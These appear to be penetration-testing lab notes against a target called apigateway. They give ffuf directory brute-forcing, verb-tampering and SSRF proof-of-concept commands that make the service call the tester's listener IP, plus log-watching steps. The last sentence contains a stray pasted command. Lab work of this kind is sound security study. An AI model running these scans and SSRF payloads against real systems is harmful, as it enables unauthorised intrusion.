directory scan:
```powershell
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://apigateway:8000/FUZZ -t 200 -o endpoints.json
```
We could convert the json into a hashmap and work with the object:
```powershell
$hashtable = gc -raw ./endpoints.json | ConvertFrom-Json -AsHashtable 
$hashtable.results
```
but here is a more effective one liner:
```powershell
gc -raw ./endpoints.json | ConvertFrom-Json -AsHashtable | % -process { $_.results.GetEnumerator()} | % -process {Add-Content -Path parsed-urls.txt -Value $_.url}
```
Stripped Files
```powershell
foreach ($i in gc ./parsed-urls.txt) {Add-Content -Path endpoints-stripped.txt -value $i.split('/')[3]}
```
Http verb tampering
```powershell
Invoke-RouteBuster -ActionList ./actions-only-valid.txt -Wordlist ./wordlist-only-valid.txt -Target http://apigateway:8000 -Methods get,post
```

ssrf poc:
In particular this is a good example of how to send a json payload
```powershell
iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http://192.168.119.144/"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
```
```bash
curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.118.3/ssrftest"}' http://apigateway:8000/files/import
```

One interesting observeration is that python3 webserver provides less information than apache. To be specific when reading the apache servers logs we are able to see the user agent of the file import microservice: axios/0.21.1
```bash
sudo systemctl start apache2
sudo systemctl status apache
sudo tail /var/log/apache2/access.log -f
```

One thing also worth mentioning is that 'Access-Control-Allow-Credentials' is set on file/import and almost every other endpoing we bruteforcedsudo tail /var/log/apache2/access.log -f
